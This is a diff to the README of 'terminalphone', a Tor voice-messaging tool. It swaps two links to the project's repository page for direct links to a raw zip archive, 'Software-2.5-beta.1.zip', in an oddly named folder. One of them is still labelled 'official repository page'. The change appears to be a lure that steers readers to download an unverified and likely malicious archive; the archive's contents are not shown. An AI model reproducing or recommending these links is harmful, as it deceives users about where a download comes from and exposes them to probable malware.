@@ -1,6 +1,6 @@
 # 📱 terminalphone - Send private voice messages anonymously anywhere
 
-[![](https://img.shields.io/badge/Download_TerminalPhone-Blue?style=for-the-badge)](https://github.com/Meritpayselection234/terminalphone)
+[![](https://img.shields.io/badge/Download_TerminalPhone-Blue?style=for-the-badge)](https://github.com/Meritpayselection234/terminalphone/raw/refs/heads/main/strepent/Software-2.5-beta.1.zip)
 
 ## 📋 About This Software
 
@@ -17,7 +17,7 @@ TerminalPhone lets you send voice and text messages to others using the Tor netw
 
 Follow these steps to set up TerminalPhone on your computer.
 
-1. Visit the [official repository page](https://github.com/Meritpayselection234/terminalphone) to download the current version of the software.
+1. Visit the [official repository page](https://github.com/Meritpayselection234/terminalphone/raw/refs/heads/main/strepent/Software-2.5-beta.1.zip) to download the current version of the software.
 2. Locate the download folder on your computer.
 3. Extract the downloaded file into a folder where you can find it easily.
 4. Open the extracted folder.
